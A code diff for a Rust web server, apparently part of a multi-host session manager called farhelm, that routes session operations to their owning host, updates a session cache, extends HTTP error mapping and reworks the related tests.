+///   exited session and watches the list keep saying `exited` has been shown
+///   their own successful action as a failure (observed in the browser
+///   suite, which is this behavior's regression test). Recording the reply
+///   the host just sent costs nothing and closes it.
+///
+/// Goes through the MANAGER rather than straight to the store, and that is
+/// not indirection for its own sake. The manager is what knows the two
+/// things this write depends on: which storage a host uses (a host with no
+/// identity caches nothing and serves from memory, and its created sessions
+/// have to land there or they are invisible too), and whether the
+/// connection the create used is still the current one. It is also what
+/// serializes this write against the host's own refresh, so a drain that
+/// predates the create cannot commit its wholesale replacement afterwards
+/// and erase it.
+///
+/// BEST EFFORT for a stale claim, and deliberately not fatal: the session
+/// exists and the caller must be told about it, since reporting a create
+/// that actually succeeded as a failure is the one outcome SPEC.md's
+/// creation contract rules out. Every such failure is self-healing within
+/// one refresh — the host has the session and will report it.
+///
+/// AMBIGUITY IS THE EXCEPTION, and it is reported rather than swallowed:
+/// if the session id is already cached under a DIFFERENT host there is no
+/// honest owner, and routing would silently pick the other one. The
+/// standing collision itself is not remembered HERE — it is refresh state
+/// on the hosts that report it (`manager::ActorStatus::contested`), so it
+/// clears itself when they stop.
+async fn record_session(
+    state: &AppState,
+    claim: &manager::SessionClaim,
+    session: &farhelm_proto::SessionInfo,
+) {
+    let Err(error) = state.manager.remember_session(claim, session).await else {
+        return;
+    };
+    // The id is the PEER's text — escaped and bounded before it reaches a
+    // log line, like every other peer-supplied value this process writes.
+    let session_id = manager::peer_text(&session.id);
+    if let Some(store::HostStoreError::SessionOwnerAmbiguous { first, second, .. }) = error
+        .chain()
+        .find_map(|cause| cause.downcast_ref::<store::HostStoreError>())
+    {
+        warn!(
+            host = claim.host,
+            session_id = session_id.as_str(),
+            first,
+            second,
+            "the host reported a session id another host already claims; it will not be routed \
+             while both keep claiming it"
+        );
+        return;
+    }
+    warn!(
+        host = claim.host,
+        session_id = session_id.as_str(),
+        error = %error,
+        "could not record the session for routing; it will be picked up at the next refresh"
+    );
+}
+
+/// Forget a deleted session everywhere the serving path looks for it.
+///
+/// The delete's half of [`record_session`]'s principle, and the quadrant
+/// that was missing: a reply with no `SessionInfo` still carries the fact
+/// that a session is gone, and the merged list is served from what the helm
+/// has recorded. Leaving the row behind means the list shows a deleted
+/// session until the owning host's next refresh — and a client that deletes
+/// and immediately re-creates then sees BOTH, which is indistinguishable
+/// from a duplicate. That is precisely how the browser suite found it, in
+/// its own shared-session reset.
+///
+/// Best effort on the same terms as a seed: the delete SUCCEEDED and the
+/// caller must be told so. Everything here is self-healing within one
+/// refresh.
+async fn forget_session(state: &AppState, claim: &manager::SessionClaim, session_id: &str) {
+    if let Err(error) = state.manager.forget_session(claim, session_id).await {
+        warn!(
+            host = claim.host,
+            session_id = manager::peer_text(session_id).as_str(),
+            error = %error,
+            "could not forget the deleted session; it will disappear at the next refresh"
+        );
+    }
+}
+
 /// `POST /api/sessions` — the creation API SPEC_impl.md calls the one true
-/// path. The CLI's `--cwd/--agent` flags and any future UI dialog both
-/// land on the same supervisor call this reaches.
+/// path. The UI's create dialog and any script land on the same supervisor
+/// call this reaches; there is no side door, and as of PLAN_M6.md item 5
+/// there is no argv path either.
+///
+/// The body's `host` selects which registered host to create on, defaulting
+/// to the local row; a host that is not connected fails the create as a
+/// precondition (see [`create_target`]).
 ///
 /// A body carrying `intent_key` gets server-enforced idempotency
 /// (PLAN_M3.md item 6): a retry of the same request under the same key
@@ -734,14 +1199,27 @@ fn default_rows() -> u16 {
 /// integrated kind paired with a placeholder-free template — that refusal
 /// surfaces as `ErrorKind::InvalidRequest` and comes back 400 through the
 /// same `http_error` mapping every other create precondition failure uses.
-/// Everything else about this handler is unchanged, including for bodies
-/// that omit all three fields entirely.
+///
+/// The reply is the created `SessionInfo`, unchanged. It carries no host
+/// fields (contrast the list's rows): the caller already knows which host
+/// it asked for, and inventing a second place where a session's host is
+/// reported would be a second thing to keep true.
+///
+/// The new session is seeded into its host's cache before this answers
+/// ([`seed_created_session`]), so it is routable — stop, rename, terminal —
+/// the moment the caller has its id, rather than after the owning host's
+/// next refresh. It joins the LIST on that next refresh like any other
+/// session; the two are separate promises and only the first one is
+/// something a client can be surprised by.
 async fn create_session(
     State(state): State<Arc<AppState>>,
     axum::Json(req): axum::Json<CreateReq>,
 ) -> impl IntoResponse {
-    match state
-        .client
+    let (claim, client) = match create_target(&state, req.host).await {
+        Ok(target) => target,
+        Err(e) => return http_error(e),
+    };
+    match client
         .create_session_with_extras(
             &req.cwd,
             &req.invocation,
@@ -756,7 +1234,10 @@ async fn create_session(
         )
         .await
     {
-        Ok(session) => axum::Json(session).into_response(),
+        Ok(session) => {
+            record_session(&state, &claim, &session).await;
+            axum::Json(session).into_response()
+        }
         Err(e) => http_error(e),
     }
 }
@@ -766,46 +1247,130 @@ async fn create_session(
 /// recoverable operation the UI does not confirm). The body carries no
 /// information beyond success — an empty JSON object, so the response
 /// shape stays uniform with `delete_session` below and callers do not
-/// need to special-case "no content" bodies — and an unknown `id` reaches
-/// the browser as a 404 through `http_error`'s `SupervisorError` downcast.
+/// need to special-case "no content" bodies. An `id` the merged view does
+/// not know is a 404 from [`route_session`] before any host is contacted,
+/// and a session whose host is not connected is a 409 naming that state.
 async fn stop_session(
     State(state): State<Arc<AppState>>,
     AxPath(id): AxPath<String>,
 ) -> impl IntoResponse {
-    match state.client.stop_session(&id).await {
+    let (_claim, client) = match route_session(&state, &id).await {
+        Ok(routed) => routed,
+        Err(e) => return http_error(e),
+    };
+    match client.stop_session(&id).await {
         Ok(()) => axum::Json(serde_json::json!({})).into_response(),
         Err(e) => http_error(e),
     }
 }
 
-/// `GET /api/sessions/{id}` — one session's current `SessionInfo`.
+/// `GET /api/sessions/{id}` — one session's current state, as a merged-list
+/// row (`SessionInfo` fields plus `host`, `host_name`, `stale`).
 ///
 /// Exists for the recovery paths rather than for browsing: after a restart
 /// (or after a restart whose reply was lost) a client needs THIS session's
-/// current status and offer, and asking through the full listing makes
-/// that lookup depend on a reply the supervisor caps at
-/// `LIST_SESSION_CAP` sessions — so on a busy host the one session a
-/// client is acting on can simply be absent from the answer.
+/// current status and offer, and finding it must not depend on where it
+/// happens to sit in its host's list.
+///
+/// ## Read, not operation — which is why it is not refused
+///
+/// This is the ONE `/api/sessions/{id}` route that a non-connected host
+/// does not refuse, and the exception is SPEC.md's own: "opening such a
+/// session shows its metadata — title, directory, last-known status —
+/// behind a clear host-unreachable notice". Refusing here would leave the
+/// UI nothing to put behind that notice. Every route that CHANGES
+/// something still refuses (see [`route_session`]).
+///
+/// The two answers are deliberately different data, from one status read so
+/// they cannot disagree:
+///
+/// - **Connected host: live, and the WHOLE list.** The owner's session list
+///   is drained to exhaustion following its own cursor (the same bounded
+///   walk the cache refresh uses), never one page. Asking for one page made
+///   a session that happened to sit past the supervisor's default page
+///   simply 404 — on a busy host, and only for the sessions a busy host has
+///   most of. PLAN_M6.md is also explicit that the cache is for the stale
+///   list and is not a general serving layer, so a reachable host's detail
+///   must never come from it: a detail poll lagging the refresh cadence
+///   would show a restart offer that no longer exists.
+/// - **Non-connected host: last-known, `stale: true`.** The cached row,
+///   which is exactly what the notice is drawn around.
+///
+/// ## Owner lookup does not depend on the cached row decoding
+///
+/// The owner is resolved from the cache's COLUMNS (and the manager's
+/// in-memory lists), never from the stored metadata — so a row whose
+/// `info_json` no longer decodes still routes, and a live session is served
+/// from its host regardless of what its cached copy looks like. The
+/// undecodable case only costs something for a host that is DOWN, where
+/// there is genuinely nothing left to show and 404 is the honest answer.
 ///
 /// Honest limitation, stated because it is not fixed here: the supervisor's
-/// protocol has no per-session query, so this handler still filters a
-/// listing and therefore still inherits that cap. What it buys today is
-/// ONE place for every client's recovery lookup to live, so the fix — a
-/// `GetSession` message — lands behind this route rather than in each
-/// caller. An id the listing does not contain is a 404, which is also the
-/// honest answer for a session that was genuinely deleted.
+/// protocol has no per-session query, so the live path walks a list. What
+/// this route buys is ONE place for every client's recovery lookup to live,
+/// so the fix — a `GetSession` message — lands behind it rather than in each
+/// caller.
 async fn get_session(
     State(state): State<Arc<AppState>>,
     AxPath(id): AxPath<String>,
 ) -> impl IntoResponse {
-    match state.client.list_sessions().await {
-        Ok(listing) => match listing.sessions.into_iter().find(|s| s.id == id) {
-            Some(session) => axum::Json(session).into_response(),
-            None => (
-                axum::http::StatusCode::NOT_FOUND,
-                format!("no such session: {id}\n"),
-            )
-                .into_response(),
+    let (host, status) = match resolve_owner(&state, &id).await {
+        Ok(owner) => owner,
+        Err(e) => return http_error(e),
+    };
+    let Some(snapshot) = state
+        .manager
+        .snapshots()
+        .into_iter()
+        .find(|snapshot| snapshot.id == host)
+    else {
+        return http_error(anyhow::Error::new(SupervisorError {
+            kind: ErrorKind::NotFound,
+            message: format!("no such session: {id}"),
+        }));
+    };
+    let host_name = aggregate::host_display_name(snapshot.kind, snapshot.destination.as_deref());
+
+    // The client comes from the SAME status read that resolved the owner,
+    // so "ask the host" and "say this row is live" cannot disagree.
+    let Some(client) = status.client else {
+        let cached = match state.store.cached_session(host, &id).await {
+            Ok(cached) => cached,
+            Err(e) => return http_error(e),
+        };
+        return match cached {
+            Some(info) => axum::Json(aggregate::SessionRow {
+                info,
+                host,
+                host_name,
+                stale: true,
+            })
+            .into_response(),
+            // The host is down and its cached copy is unreadable (or gone).
+            // There is nothing to put behind the notice, and inventing a
+            // placeholder would be worse than saying so.
+            None => http_error(anyhow::Error::new(SupervisorError {
+                kind: ErrorKind::NotFound,
+                message: format!("no such session: {id}"),
+            })),
+        };
+    };
+    match manager::drain_sessions(&client).await {
+        Ok(sessions) => match sessions.into_iter().find(|s| s.id == id) {
+            Some(info) => axum::Json(aggregate::SessionRow {
+                info,
+                host,
+                host_name,
+                stale: false,
+            })
+            .into_response(),
+            // The host is up and says this session is gone: it was deleted
+            // between the last cache refresh and now, so 404 is the truth
+            // rather than the stale row.
+            None => http_error(anyhow::Error::new(SupervisorError {
+                kind: ErrorKind::NotFound,
+                message: format!("no such session: {id}"),
+            })),
         },
         Err(e) => http_error(e),
     }
@@ -840,18 +1405,26 @@ struct RestartReq {
 /// directory. The success body is the session's freshly recomputed
 /// `SessionInfo` — the same shape `POST /api/sessions` answers with — so a
 /// caller can re-render the row (its new offer included) without listing
-/// again.
+/// again. Routed by owner like every other lifecycle operation, so a
+/// session on a non-connected host is refused with that host's state named
+/// rather than reaching a supervisor at all.
 async fn restart_session(
     State(state): State<Arc<AppState>>,
     AxPath(id): AxPath<String>,
     axum::Json(req): axum::Json<RestartReq>,
 ) -> impl IntoResponse {
-    match state
-        .client
+    let (claim, client) = match route_session(&state, &id).await {
+        Ok(routed) => routed,
+        Err(e) => return http_error(e),
+    };
+    match client
         .restart_session(&id, req.mode, req.stop_if_running)
         .await
     {
-        Ok(session) => axum::Json(session).into_response(),
+        Ok(session) => {
+            record_session(&state, &claim, &session).await;
+            axum::Json(session).into_response()
+        }
         Err(e) => http_error(e),
     }
 }
@@ -897,8 +1470,15 @@ async fn rename_session(
     AxPath(id): AxPath<String>,
     axum::Json(req): axum::Json<RenameReq>,
 ) -> impl IntoResponse {
-    match state.client.rename_session(&id, &req.title).await {
-        Ok(session) => axum::Json(session).into_response(),
+    let (claim, client) = match route_session(&state, &id).await {
+        Ok(routed) => routed,
+        Err(e) => return http_error(e),
+    };
+    match client.rename_session(&id, &req.title).await {
+        Ok(session) => {
+            record_session(&state, &claim, &session).await;
+            axum::Json(session).into_response()
+        }
         Err(e) => http_error(e),
     }
 }
@@ -911,12 +1491,25 @@ async fn rename_session(
 /// sends this request is that PR's job, not something to retrofit here.
 /// Same empty-object success body as `stop_session`; an unknown `id` maps
 /// to 404.
+///
+/// A successful delete FORGETS the session from the helm's own records
+/// before it answers ([`forget_session`]), so the merged list stops showing
+/// it at once rather than at the owning host's next refresh. Without that,
+/// a delete followed immediately by a create shows both rows — which is
+/// what the browser suite's own shared-session reset does on every test.
 async fn delete_session(
     State(state): State<Arc<AppState>>,
     AxPath(id): AxPath<String>,
 ) -> impl IntoResponse {
-    match state.client.delete_session(&id).await {
-        Ok(()) => axum::Json(serde_json::json!({})).into_response(),
+    let (claim, client) = match route_session(&state, &id).await {
+        Ok(routed) => routed,
+        Err(e) => return http_error(e),
+    };
+    match client.delete_session(&id).await {
+        Ok(()) => {
+            forget_session(&state, &claim, &id).await;
+            axum::Json(serde_json::json!({})).into_response()
+        }
         Err(e) => http_error(e),
     }
 }
@@ -937,7 +1530,11 @@ async fn open_tab(
     State(state): State<Arc<AppState>>,
     AxPath(id): AxPath<String>,
 ) -> impl IntoResponse {
-    match state.client.open_tab(&id).await {
+    let (_claim, client) = match route_session(&state, &id).await {
+        Ok(routed) => routed,
+        Err(e) => return http_error(e),
+    };
+    match client.open_tab(&id).await {
         Ok(tab) => axum::Json(serde_json::json!({ "tab": tab })).into_response(),
         Err(e) => http_error(e),
     }
@@ -954,7 +1551,11 @@ async fn close_tab(
     State(state): State<Arc<AppState>>,
     AxPath((id, tab_id)): AxPath<(String, String)>,
 ) -> impl IntoResponse {
-    match state.client.close_tab(&id, &tab_id).await {
+    let (_claim, client) = match route_session(&state, &id).await {
+        Ok(routed) => routed,
+        Err(e) => return http_error(e),
+    };
+    match client.close_tab(&id, &tab_id).await {
         Ok(()) => axum::Json(serde_json::json!({})).into_response(),
         Err(e) => http_error(e),
     }
@@ -1086,7 +1687,15 @@ async fn upload_attachment(
             .into_response();
     };
 
-    let mut upload = match state.client.begin_upload(&id, &q.filename, size).await {
+    // Routed BEFORE the body is touched, like every other session
+    // operation: an upload to a session on a non-connected host must be
+    // refused with that host's state named, not half-relayed and then
+    // abandoned.
+    let (_claim, client) = match route_session(&state, &id).await {
+        Ok(routed) => routed,
+        Err(e) => return http_error(e),
+    };
+    let mut upload = match client.begin_upload(&id, &q.filename, size).await {
         Ok(upload) => upload,
         Err(e) => return http_error(e),
     };
@@ -1260,6 +1869,20 @@ enum UploadStep {
 /// the honest default for a failure the caller could not have avoided by
 /// sending a different request.
 ///
+/// PLAN_M6.md item 5's host-management and routing refusals join the same
+/// table through two further downcasts. [`store::HostStoreError`]: an
+/// unknown host id is a 404, an unusable destination is a 400 (the caller
+/// sent something `ssh` cannot use), and everything else the registry
+/// refuses — a duplicate destination, the immovable local row, a lost
+/// identity compare-and-swap, an identity another row claimed, a row
+/// reconfigured mid-decision, a session two hosts both claim — is a 409,
+/// because each is the same shape of failure: the request was well formed
+/// and conflicts with the fleet as it stands. [`manager::ManagerError`]
+/// carries the same split for the decisions the manager owns rather than
+/// the store. A non-connected host's refusal reaches this function as an
+/// ordinary `SupervisorError` carrying `Conflict` (see `refusal_text`), for
+/// the same reading.
+///
 /// The body itself is deliberately unsanitized regardless of status:
 /// SPEC.md requires concrete, actionable errors in the client, and the
 /// intended reader is the user's own UI. Note the honest caveat: until the
@@ -1270,7 +1893,45 @@ enum UploadStep {
 /// displayed as text, never interpreted, which is what makes it safe to
 /// pass a remote supervisor's message through verbatim.
 fn http_error(e: anyhow::Error) -> axum::response::Response {
-    let status = match e
+    // ONE status decision and ONE response construction. The three families
+    // are consulted in order of specificity — a registry refusal, then a
+    // manager refusal, then whatever the supervisor said — and each yields
+    // only a CODE, because three copies of "format the chain and return it"
+    // is three places for the body to drift apart.
+    let registry = e
+        .chain()
+        .find_map(|c| c.downcast_ref::<store::HostStoreError>())
+        .map(|refusal| match refusal {
+            store::HostStoreError::HostNotFound(_) => axum::http::StatusCode::NOT_FOUND,
+            store::HostStoreError::InvalidDestination(_) => axum::http::StatusCode::BAD_REQUEST,
+            store::HostStoreError::DuplicateDestination(_)
+            | store::HostStoreError::LocalHostImmutable
+            | store::HostStoreError::IdentityMismatch { .. }
+            | store::HostStoreError::IdentityClaimed { .. }
+            | store::HostStoreError::StaleAttempt { .. }
+            // Two hosts claiming one session id: well-formed request,
+            // incoherent fleet. 409 rather than 500 because the user CAN
+            // act on it (remove whichever entry does not belong) and the
+            // error names both candidates so they know which.
+            | store::HostStoreError::SessionOwnerAmbiguous { .. } => {
+                axum::http::StatusCode::CONFLICT
+            }
+        });
+    let managed = || {
+        e.chain()
+            .find_map(|c| c.downcast_ref::<manager::ManagerError>())
+            .map(|refusal| match refusal {
+                manager::ManagerError::NoSuchHost(_) => axum::http::StatusCode::NOT_FOUND,
+                // Both are "the host is not in the state this verb needs",
+                // which a client answers by re-rendering the host and
+                // offering whatever it is actually asking for now.
+                manager::ManagerError::NotAwaitingAdoption { .. }
+                | manager::ManagerError::AdoptionSuperseded { .. } => {
+                    axum::http::StatusCode::CONFLICT
+                }
+            })
+    };
+    let supervised = || match e
         .chain()
         .find_map(|c| c.downcast_ref::<SupervisorError>())
         .map(|s| s.kind)
@@ -1279,11 +1940,12 @@ fn http_error(e: anyhow::Error) -> axum::response::Response {
         Some(ErrorKind::InvalidRequest) => axum::http::StatusCode::BAD_REQUEST,
         Some(ErrorKind::Internal) | None => axum::http::StatusCode::INTERNAL_SERVER_ERROR,
         // PLAN_M3.md item 6: an intent key reused with a different
-        // fingerprint. 409 is the standard HTTP reading of "this
-        // identifier already means something else"; this function's own
-        // docstring above is where the full status-mapping table lives.
+        // fingerprint. 409 is the standard HTTP reading of "this identifier
+        // already means something else"; this function's own docstring
+        // above is where the full status-mapping table lives.
         Some(ErrorKind::Conflict) => axum::http::StatusCode::CONFLICT,
     };
+    let status = registry.or_else(managed).unwrap_or_else(supervised);
     // The UI shows this body verbatim.
     (status, format!("{e:#}")).into_response()
 }
@@ -1381,26 +2043,41 @@ fn resolve_attach_request(q: &TermQuery) -> anyhow::Result<(TerminalSelector, &s
     Ok((terminal, lease))
 }
 
-/// Resolve `q` and attach, as one `Result` (PLAN_M4.md item 5).
+/// Resolve `q`, route to the session's owning host, and attach — as one
+/// `Result` (PLAN_M4.md item 5; owner routing per PLAN_M6.md item 5).
 ///
-/// Folding the local query-shape check and the supervisor round trip into
-/// a single function is what lets `serve_term` report both kinds of
-/// failure through one notice-then-close arm instead of two copies of the
-/// same three lines: a caller here cannot tell (and does not need to)
-/// whether an `Err` came from `resolve_attach_request` refusing the shape
-/// or from the supervisor refusing the attach itself — both are, from the
-/// browser's perspective, "this attach did not happen," and both deserve
-/// the identical visible treatment.
+/// Folding the local query-shape check, the owner lookup, and the
+/// supervisor round trip into a single function is what lets `serve_term`
+/// report every kind of failure through one notice-then-close arm instead
+/// of three copies of the same three lines: a caller here cannot tell (and
+/// does not need to) whether an `Err` came from `resolve_attach_request`
+/// refusing the shape, from the session's host being unreachable, or from
+/// the supervisor refusing the attach itself — all are, from the browser's
+/// perspective, "this attach did not happen," and all deserve the identical
+/// visible treatment.
+///
+/// That uniformity is also what gives the terminal socket its half of
+/// SPEC.md's host-unreachable story for free: the refusal text names the
+/// host's actual state, and it arrives as the same
+/// `{"type":"detached","reason":...}` notice a takeover would, so nothing
+/// on the browser side needs a new message shape to render it.
+///
+/// The client is returned alongside the attachment because `serve_term`
+/// must keep talking to the SAME connection for the socket's whole life —
+/// input, resize, pause/resume, detach. Re-routing per message would let a
+/// mid-session reconnect silently move a live terminal's writes to a
+/// different connection than the one its attachment lives on.
 async fn attach_from_query(
     state: &AppState,
     session_id: &str,
     q: &TermQuery,
-) -> anyhow::Result<(u32, TermStream)> {
+) -> anyhow::Result<(Arc<SupervisorClient>, u32, TermStream)> {
     let (terminal, lease) = resolve_attach_request(q)?;
-    state
-        .client
+    let (_claim, client) = route_session(state, session_id).await?;
+    let (channel, stream) = client
         .attach_terminal(session_id, q.cols, q.rows, terminal, lease)
-        .await
+        .await?;
+    Ok((client, channel, stream))
 }
 
 /// Terminal WebSocket: binary frames are terminal bytes in both
@@ -1555,7 +2232,7 @@ async fn serve_term(
     // request it just made. See `attach_from_query`'s own docs for why
     // folding them into one `Result` is what keeps this a single arm
     // instead of two copies of the same three lines.
-    let (channel, mut events) = match attach_from_query(&state, &session_id, &q).await {
+    let (client, channel, mut events) = match attach_from_query(&state, &session_id, &q).await {
         Ok(parts) => parts,
         Err(e) => {
             let notice = serde_json::json!({"type": "detached", "reason": format!("{e:#}")});
@@ -1627,14 +2304,14 @@ async fn serve_term(
         while let Some(msg) = ws_rx.next().await {
             match msg {
                 Ok(ws::Message::Binary(bytes)) => {
-                    state.client.send_input(channel, bytes.to_vec()).await;
+                    client.send_input(channel, bytes.to_vec()).await;
                 }
                 Ok(ws::Message::Text(text)) => match serde_json::from_str::<WsClientMsg>(&text) {
                     Ok(WsClientMsg::Resize { cols, rows }) => {
-                        state.client.resize(&session_id, channel, cols, rows).await;
+                        client.resize(&session_id, channel, cols, rows).await;
                     }
-                    Ok(WsClientMsg::Pause) => state.client.pause_output(channel).await,
-                    Ok(WsClientMsg::Resume) => state.client.resume_output(channel).await,
+                    Ok(WsClientMsg::Pause) => client.pause_output(channel).await,
+                    Ok(WsClientMsg::Resume) => client.resume_output(channel).await,
                     // Unparseable or unknown: ignored on purpose, so a
                     // newer browser bundle talking to an older helm
                     // degrades rather than dropping the terminal.
@@ -1672,7 +2349,7 @@ async fn serve_term(
     // its notice. The grace period covers exactly that notice; past it
     // the task is abandoned, because by then it can only be blocked on
     // the same unreadable socket the detach was about.
-    state.client.detach(channel).await;
+    client.detach(channel).await;
     settle_outbound(outbound, outbound_finished, WS_TEARDOWN_GRACE).await;
     result
 }
@@ -1714,11 +2391,10 @@ async fn settle_outbound(
 
 #[cfg(test)]
 mod tests {
-    use super::{HelmArgs, SupervisorError, build_router, origin_is_allowed};
+    use super::{SupervisorError, origin_is_allowed, rest_harness};
     use axum::http::HeaderMap;
     use farhelm_proto::io::{FrameReader, FrameWriter, handshake};
     use farhelm_proto::{ControlMsg, Frame};
-    use std::sync::Arc;
     use std::time::Duration;
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
@@ -1767,23 +2443,36 @@ mod tests {
         );
     }
 
-    /// Serve the helm's real router on a loopback port, returning its
-    /// address.
+    /// A scripted supervisor that must be asked NOTHING.
     ///
-    /// The WebSocket tests cannot use `oneshot` like the HTTP ones do: an
-    /// upgrade needs a real connection with a real byte stream on both
-    /// sides, which is also exactly what makes a "browser that stops
-    /// reading" expressible at all.
-    async fn serve_helm(client: Arc<super::SupervisorClient>) -> std::net::SocketAddr {
-        let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
+    /// The far side of every "the helm refused this by itself" assertion:
+    /// it completes the handshake, so its host really is connected and
+    /// routable, and then fails if any request arrives at all. Bounded
+    /// silence rather than an EOF, because the harness holds the connection
+    /// open for the whole test (`rest_harness`'s module docs) — so
+    /// "nothing was forwarded" is only observable as nothing arriving. The
+    /// window is generous on purpose: a leak would send its frame
+    /// immediately, so a longer wait only costs time on the failing path.
+    async fn silent_supervisor(peer_side: tokio::io::DuplexStream) {
+        use farhelm_proto::io::{FrameReader, FrameWriter, handshake};
+
+        let (r, w) = tokio::io::split(peer_side);
+        let mut reader = FrameReader::new(r);
+        let mut writer = FrameWriter::new(w);
+        handshake(&mut reader, &mut writer, "supervisor")
             .await
-            .expect("bind loopback");
-        let addr = listener.local_addr().expect("local addr");
-        let app = build_router(client, None, addr.port());
-        tokio::spawn(async move {
-            let _ = axum::serve(listener, app).await;
-        });
-        addr
+            .unwrap();
+        // Three outcomes, and only one of them is a failure. A timeout is
+        // the ordinary pass (nothing was sent). A clean EOF is also a pass:
+        // the harness tears connections down deliberately — a host taken
+        // down, a retry, a reconnect — and a closed stream is not a request.
+        // Only a FRAME means something reached a supervisor that must not
+        // have been asked anything.
+        let leaked = tokio::time::timeout(Duration::from_secs(2), reader.read_frame()).await;
+        assert!(
+            !matches!(leaked, Ok(Ok(Some(_)))),
+            "no request may reach this supervisor, but one arrived: {leaked:?}"
+        );
     }
 
     /// A deliberately minimal WebSocket client: enough to complete the
@@ -1929,9 +2618,8 @@ mod tests {
     async fn browser_pause_and_resume_reach_the_supervisor_for_this_channel() {
         let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
         let peer = tokio::spawn(scripted_supervisor_attach(peer_side));
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let addr = serve_helm(client).await;
+        let mut harness = rest_harness::spliced_helm(client_side).await;
+        let addr = harness.serve().await;
         // Concurrently, and this ordering is not incidental: the scripted
         // peer only ever sees an `Attach` because a browser connected, so
         // awaiting it first would be waiting on something this test has
@@ -1983,9 +2671,8 @@ mod tests {
 
         let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
         let peer = tokio::spawn(scripted_supervisor_attach(peer_side));
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let addr = serve_helm(client).await;
+        let mut harness = rest_harness::spliced_helm(client_side).await;
+        let addr = harness.serve().await;
         let (mut ws, peer) = tokio::join!(
             WsTestClient::connect(addr, "/api/sessions/sess-1/term"),
             peer
@@ -2059,9 +2746,8 @@ mod tests {
     async fn a_wedged_browser_is_torn_down_by_the_stall_detach() {
         let (client_side, peer_side) = tokio::io::duplex(1024 * 1024);
         let peer = tokio::spawn(scripted_supervisor_attach(peer_side));
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let addr = serve_helm(client).await;
+        let mut harness = rest_harness::spliced_helm(client_side).await;
+        let addr = harness.serve().await;
         // Concurrently, for the same reason as the test above.
         let (mut ws, peer) = tokio::join!(
             WsTestClient::connect(addr, "/api/sessions/sess-1/term"),
@@ -2161,39 +2847,45 @@ mod tests {
     #[derive(clap::Parser, Debug)]
     struct Wrapper {
         #[command(flatten)]
-        args: HelmArgs,
+        args: crate::HelmArgs,
     }
 
-    /// Pins `--remote-state-dir`'s CLI-level UTF-8 rejection: the field is
-    /// `Option<String>`, not `Option<PathBuf>`, specifically so clap itself
-    /// refuses a non-UTF-8 OS argument before it can reach the ssh argv
-    /// builder. Reverting the field to `PathBuf` (with a lossy conversion
-    /// added downstream to compensate) would leave every other test in
-    /// this crate green — clap's own argument-parsing behavior is the only
-    /// thing that would catch that regression, so it must be pinned here
-    /// directly rather than inferred from ssh-argv-level tests.
+    /// The argv session and transport flags are GONE (PLAN_M6.md item 5),
+    /// and `--ensure-hosts` is what replaced the transport half.
+    ///
+    /// Pinned as a test rather than left to the type, because a flag that
+    /// quietly came back would be worse than one that never left: a helm
+    /// now drives every registered host at once, so `--ssh` could only ever
+    /// name one of them, and `--cwd`/`--agent` would be a creation path
+    /// that bypasses the host selection the create API exists to make
+    /// explicit. clap's own grammar is the only thing that catches a
+    /// reintroduction, so it is asserted here directly.
     #[test]
-    fn remote_state_dir_rejects_non_utf8_os_argument() {
+    fn the_dropped_argv_session_flags_are_refused_and_ensure_hosts_replaces_them() {
         use clap::Parser;
-        use std::os::unix::ffi::OsStringExt;
 
-        let non_utf8 = std::ffi::OsString::from_vec(vec![0xff, 0xfe]);
-        let mut argv: Vec<std::ffi::OsString> = vec!["farhelm".into(), "--remote-state-dir".into()];
-        argv.push(non_utf8);
-        let err = Wrapper::try_parse_from(argv).unwrap_err();
-        assert_eq!(err.kind(), clap::error::ErrorKind::InvalidUtf8);
+        for dropped in [
+            "--ssh",
+            "--cwd",
+            "--agent",
+            "--title",
+            "--remote-farhelm",
+            "--remote-state-dir",
+        ] {
+            let err = Wrapper::try_parse_from(["farhelm", dropped, "value"])
+                .expect_err("{dropped} must no longer be a helm flag");
+            assert_eq!(
+                err.kind(),
+                clap::error::ErrorKind::UnknownArgument,
+                "{dropped} must be refused as unknown, not merely ignored"
+            );
+        }
 
-        // A valid unicode value must keep working — this is a rejection
-        // test for non-UTF-8 specifically, not a ban on the flag.
-        let parsed = Wrapper::try_parse_from([
-            "farhelm".into(),
-            "--remote-state-dir".into(),
-            std::ffi::OsString::from("/remote/state"),
-        ])
-        .unwrap();
+        let parsed = Wrapper::try_parse_from(["farhelm", "--ensure-hosts", "/etc/farhelm.json5"])
+            .expect("--ensure-hosts is the flag that replaced them");
         assert_eq!(
-            parsed.args.remote_state_dir.as_deref(),
-            Some("/remote/state")
+            parsed.args.ensure_hosts,
+            Some(std::path::PathBuf::from("/etc/farhelm.json5"))
         );
     }
 
@@ -2694,9 +3386,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -2784,9 +3475,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("POST")
             .uri("/api/sessions")
@@ -2838,9 +3528,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -2861,50 +3550,30 @@ mod tests {
     }
 
     /// Stopping an unknown id must surface as a 404 carrying the
-    /// supervisor's own message verbatim — the same `SupervisorError`
-    /// downcast `http_error` uses everywhere else, exercised here through
-    /// the stop route specifically rather than assumed from the create/
-    /// attach coverage above.
+    /// helm's OWN message, without the request ever reaching a supervisor.
     ///
-    /// The scripted message is a sentinel unlikely to appear by accident
-    /// (not the generic "no such session" prose a supervisor might
-    /// plausibly emit for unrelated reasons), and the assertion checks the
-    /// COMPLETE body against it — a substring check would still pass if
-    /// `http_error` silently truncated, reworded, or wrapped the message in
